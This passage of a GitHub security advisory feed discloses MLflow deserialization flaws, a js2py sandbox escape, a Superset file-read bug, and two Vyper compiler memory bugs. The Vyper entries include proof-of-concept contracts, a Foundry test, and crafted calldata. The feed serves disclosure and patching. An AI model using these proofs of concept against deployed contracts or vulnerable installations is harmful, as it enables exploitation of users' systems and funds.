        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.1.0 or newer, enabling a maliciously uploaded scikit-learn model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37053">https://nvd.nist.gov/vuln/detail/CVE-2024-37053</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-43c4-9qgj-x742">https://github.com/advisories/GHSA-43c4-9qgj-x742</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-43c4-9qgj-x742</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-76cg-cfhx-373f</id>
        <link href="https://github.com/advisories/GHSA-76cg-cfhx-373f"/>
        <updated>2024-06-21T14:34:14.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.1.0 or newer, enabling a maliciously uploaded scikit-learn model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37052">https://nvd.nist.gov/vuln/detail/CVE-2024-37052</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-76cg-cfhx-373f">https://github.com/advisories/GHSA-76cg-cfhx-373f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-76cg-cfhx-373f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-cv6c-7963-wxcg</id>
        <link href="https://github.com/advisories/GHSA-cv6c-7963-wxcg"/>
        <updated>2024-06-21T14:33:53.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.27.0 or newer, enabling a maliciously crafted Recipe to execute arbitrary code on an end user’s system when run.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37060">https://nvd.nist.gov/vuln/detail/CVE-2024-37060</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-cv6c-7963-wxcg">https://github.com/advisories/GHSA-cv6c-7963-wxcg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cv6c-7963-wxcg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-wf7f-8fxf-xfxc</id>
        <link href="https://github.com/advisories/GHSA-wf7f-8fxf-xfxc"/>
        <updated>2024-06-21T14:33:32.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 0.5.0 or newer, enabling a maliciously uploaded PyTorch model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37059">https://nvd.nist.gov/vuln/detail/CVE-2024-37059</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-wf7f-8fxf-xfxc">https://github.com/advisories/GHSA-wf7f-8fxf-xfxc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wf7f-8fxf-xfxc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-ghv6-9r9j-wh4j</id>
        <link href="https://github.com/advisories/GHSA-ghv6-9r9j-wh4j"/>
        <updated>2024-06-21T14:25:32.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 0.9.0 or newer, enabling a maliciously uploaded PyFunc model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37054">https://nvd.nist.gov/vuln/detail/CVE-2024-37054</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-ghv6-9r9j-wh4j">https://github.com/advisories/GHSA-ghv6-9r9j-wh4j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ghv6-9r9j-wh4j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[js2py] js2py allows remote code execution]]></title>
        <id>https://github.com/advisories/GHSA-h95x-26f3-88hr</id>
        <link href="https://github.com/advisories/GHSA-h95x-26f3-88hr"/>
        <updated>2024-06-20T19:19:57.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in the component <code>js2py.disable_pyimport()</code> of js2py up to v0.74 allows attackers to execute arbitrary code via a crafted API call.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28397">https://nvd.nist.gov/vuln/detail/CVE-2024-28397</a></li>
<li><a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape">https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape</a></li>
<li><a href="https://github.com/PiotrDabkowski/Js2Py/pull/323">https://github.com/PiotrDabkowski/Js2Py/pull/323</a></li>
<li><a href="https://github.com/advisories/GHSA-h95x-26f3-88hr">https://github.com/advisories/GHSA-h95x-26f3-88hr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h95x-26f3-88hr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-20T18:34:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-superset] Apache Superset server arbitrary file read ]]></title>
        <id>https://github.com/advisories/GHSA-hcr7-cqwc-q5gq</id>
        <link href="https://github.com/advisories/GHSA-hcr7-cqwc-q5gq"/>
        <updated>2024-06-20T16:15:10.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Input Validation vulnerability in Apache Superset, allows for an authenticated attacker to create a MariaDB connection with local_infile enabled. If both the MariaDB server (off by default) and the local mysql client on the web server are set to allow for local infile, it's possible for the attacker to execute a specific MySQL/MariaDB SQL command that is able to read files from the server and insert their content on a MariaDB database table. This issue affects Apache Superset before version 3.1.3 and in version 4.0.0.</p>
<p>Users are recommended to upgrade to version 4.0.1 or 3.1.3, both of which fix the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34693">https://nvd.nist.gov/vuln/detail/CVE-2024-34693</a></li>
<li><a href="https://lists.apache.org/thread/1803x1s34m7r71h1k0q1njol8k6fmyon">https://lists.apache.org/thread/1803x1s34m7r71h1k0q1njol8k6fmyon</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/06/20/1">http://www.openwall.com/lists/oss-security/2024/06/20/1</a></li>
<li><a href="https://github.com/advisories/GHSA-hcr7-cqwc-q5gq">https://github.com/advisories/GHSA-hcr7-cqwc-q5gq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hcr7-cqwc-q5gq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-20T09:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-superset] Apache Superset server arbitrary file read ]]></title>
        <id>https://github.com/advisories/GHSA-hcr7-cqwc-q5gq</id>
        <link href="https://github.com/advisories/GHSA-hcr7-cqwc-q5gq"/>
        <updated>2024-06-20T16:15:10.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Input Validation vulnerability in Apache Superset, allows for an authenticated attacker to create a MariaDB connection with local_infile enabled. If both the MariaDB server (off by default) and the local mysql client on the web server are set to allow for local infile, it's possible for the attacker to execute a specific MySQL/MariaDB SQL command that is able to read files from the server and insert their content on a MariaDB database table. This issue affects Apache Superset before version 3.1.3 and in version 4.0.0.</p>
<p>Users are recommended to upgrade to version 4.0.1 or 3.1.3, both of which fix the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34693">https://nvd.nist.gov/vuln/detail/CVE-2024-34693</a></li>
<li><a href="https://lists.apache.org/thread/1803x1s34m7r71h1k0q1njol8k6fmyon">https://lists.apache.org/thread/1803x1s34m7r71h1k0q1njol8k6fmyon</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/06/20/1">http://www.openwall.com/lists/oss-security/2024/06/20/1</a></li>
<li><a href="https://github.com/advisories/GHSA-hcr7-cqwc-q5gq">https://github.com/advisories/GHSA-hcr7-cqwc-q5gq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hcr7-cqwc-q5gq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-20T09:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper's external calls can overflow return data to return input buffer]]></title>
        <id>https://github.com/advisories/GHSA-gp3w-2v2m-p686</id>
        <link href="https://github.com/advisories/GHSA-gp3w-2v2m-p686"/>
        <updated>2024-06-18T15:17:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When calls to external contracts are made, we write the input buffer starting at byte 28, and allocate the return buffer to start at byte 0 (overlapping with the input buffer). When checking <code>RETURNDATASIZE</code> for dynamic types, the size is compared only to the minimum allowed size for that type, and not to the returned value's <code>length</code>. As a result, malformed return data can cause the contract to mistake data from the input buffer for returndata.</p>
<p>This advisory is given a severity of "Low" because when the called contract returns invalid ABIv2 encoded data, the calling contract can read different invalid data (from the dirty buffer) than the called contract returned.</p>
<h2 id="details">Details</h2>
<p>When arguments are packed for an external call, we create a buffer of size <code>max(args, return_data) + 32</code>. The input buffer is placed in this buffer (starting at byte 28), and the return buffer is allocated to start at byte 0. The assumption is that we can reuse the memory becase we will not be able to read past <code>RETURNDATASIZE</code>.</p>
<pre><code class="language-python">if fn_type.return_type is not None:
    return_abi_t = calculate_type_for_external_return(fn_type.return_type).abi_type

    # we use the same buffer for args and returndata,
    # so allocate enough space here for the returndata too.
    buflen = max(args_abi_t.size_bound(), return_abi_t.size_bound())
else:
    buflen = args_abi_t.size_bound()

buflen += 32  # padding for the method id
</code></pre>
<p>When data is returned, we unpack the return data by starting at byte 0. We check that <code>RETURNDATASIZE</code> is greater than the minimum allowed for the returned type:</p>
<pre><code class="language-python">if not call_kwargs.skip_contract_check:
    assertion = IRnode.from_list(
        ["assert", ["ge", "returndatasize", min_return_size]],
        error_msg="returndatasize too small",
    )
    unpacker.append(assertion)
</code></pre>
<p>This check ensures that any dynamic types returned will have a size of at least 64. However, it does not verify that <code>RETURNDATASIZE</code> is as large as the <code>length</code> word of the dynamic type. </p>
<p>As a result, if a contract expects a dynamic type to be returned, and the part of the return data that is read as <code>length</code> includes a size that is larger than the actual <code>RETURNDATASIZE</code>, the return data read from the buffer will overrun the actual return data size and read from the input buffer.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>This contract calls an external contract with two arguments. As the call is made, the buffer includes:</p>
<ul>
<li>byte 28: method_id</li>
<li>byte 32: first argument (0)</li>
<li>byte 64: second argument (hash)</li>
</ul>
<p>The return data buffer begins at byte 0, and will return the returned bytestring, up to a maximum length of 96 bytes.</p>
<pre><code class="language-python">interface Zero:
    def sneaky(a: uint256, b: bytes32) -&gt; Bytes[96]: view

@external
def test_sneaky(z: address) -&gt; Bytes[96]:
    return Zero(z).sneaky(0, keccak256("oops"))
</code></pre>
<p>On the other side, imagine a simple contract that does not, in fact, return a bytestring, but instead returns two uint256s. I've implemented it in Solidity for ease of use with Foundry:</p>
<pre><code class="language-solidity">function sneaky(uint a, bytes32 b) external pure returns (uint, uint) {
    return (32, 32);
}
</code></pre>
<p>The return data will be parsed as a bytestring. The first 32 will point us to byte 32 to read the length. The second 32 will be perceived as the length. It will then read the next 32 bytes from the return data buffer, even though those weren't a part of the return data.</p>
<p>Since these bytes will come from byte 64, we can see above that the hash was placed there in the input buffer.</p>
<p>If we run the following Foundry test, we can see that this does in fact happen:</p>
<pre><code class="language-solidity">function test__sneakyZeroReturn() public {
    ZeroReturn z = new ZeroReturn();
    c = SuperContract(deployer.deploy("src/loose/", "ret_overflow", ""));
    console.logBytes(c.test_sneaky(address(z)));
}
</code></pre>
<pre><code class="language-md">Logs:
  0xd54c03ccbc84dd6002c98c6df5a828e42272fc54b512ca20694392ca89c4d2c6
</code></pre>
<h3 id="patches">Patches</h3>
<p>Patched in <a href="https://github.com/vyperlang/vyper/pull/3925">https://github.com/vyperlang/vyper/pull/3925</a>, <a href="https://github.com/vyperlang/vyper/pull/4091">https://github.com/vyperlang/vyper/pull/4091</a>, <a href="https://github.com/vyperlang/vyper/pull/4144">https://github.com/vyperlang/vyper/pull/4144</a>, <a href="https://github.com/vyperlang/vyper/pull/4060">https://github.com/vyperlang/vyper/pull/4060</a>.</p>
<h2 id="impact">Impact</h2>
<p>Malicious or mistaken contracts returning the malformed data can result in overrunning the returned data and reading return data from the input buffer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-gp3w-2v2m-p686">https://github.com/vyperlang/vyper/security/advisories/GHSA-gp3w-2v2m-p686</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24560">https://nvd.nist.gov/vuln/detail/CVE-2024-24560</a></li>
<li><a href="https://github.com/advisories/GHSA-gp3w-2v2m-p686">https://github.com/advisories/GHSA-gp3w-2v2m-p686</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gp3w-2v2m-p686</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-02-02T18:10:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper's `_abi_decode` vulnerable to Memory Overflow]]></title>
        <id>https://github.com/advisories/GHSA-9p8r-4xp4-gw5w</id>
        <link href="https://github.com/advisories/GHSA-9p8r-4xp4-gw5w"/>
        <updated>2024-06-18T15:16:25.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>If an excessively large value is specified as the starting index for an array in <code>_abi_decode</code>, it can cause the read position to overflow. This results in the decoding of values outside the intended array bounds, potentially leading to bugs in contracts that use arrays within <code>_abi_decode</code>. The advisory has been assigned low severity, because it is only observable if there is a memory write between two invocations of <code>abi_decode</code> on the same input.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-vyper">event Pwn:
    pass

@external
def f(x: Bytes[32 * 3]):
    a: Bytes[32] = b"foo"
    y: Bytes[32 * 3] = x

    decoded_y1: Bytes[32] = _abi_decode(y, Bytes[32])
    a = b"bar"
    decoded_y2: Bytes[32] = _abi_decode(y, Bytes[32])

    if decoded_y1 != decoded_y2:
        log Pwn()
</code></pre>
<p>Sending the following calldata results in <code>Pwn</code> being emitted. </p>
<pre><code>0xd45754f8
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000060
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa0
</code></pre>
<h3 id="patches">Patches</h3>
<p>Patched in <a href="https://github.com/vyperlang/vyper/pull/3925">https://github.com/vyperlang/vyper/pull/3925</a>, <a href="https://github.com/vyperlang/vyper/pull/4091">https://github.com/vyperlang/vyper/pull/4091</a>, <a href="https://github.com/vyperlang/vyper/pull/4144">https://github.com/vyperlang/vyper/pull/4144</a>, <a href="https://github.com/vyperlang/vyper/pull/4060">https://github.com/vyperlang/vyper/pull/4060</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-9p8r-4xp4-gw5w">https://github.com/vyperlang/vyper/security/advisories/GHSA-9p8r-4xp4-gw5w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-26149">https://nvd.nist.gov/vuln/detail/CVE-2024-26149</a></li>
<li><a href="https://github.com/advisories/GHSA-9p8r-4xp4-gw5w">https://github.com/advisories/GHSA-9p8r-4xp4-gw5w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9p8r-4xp4-gw5w</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-02-26T20:11:07.000Z</published>
    </entry>
</feed>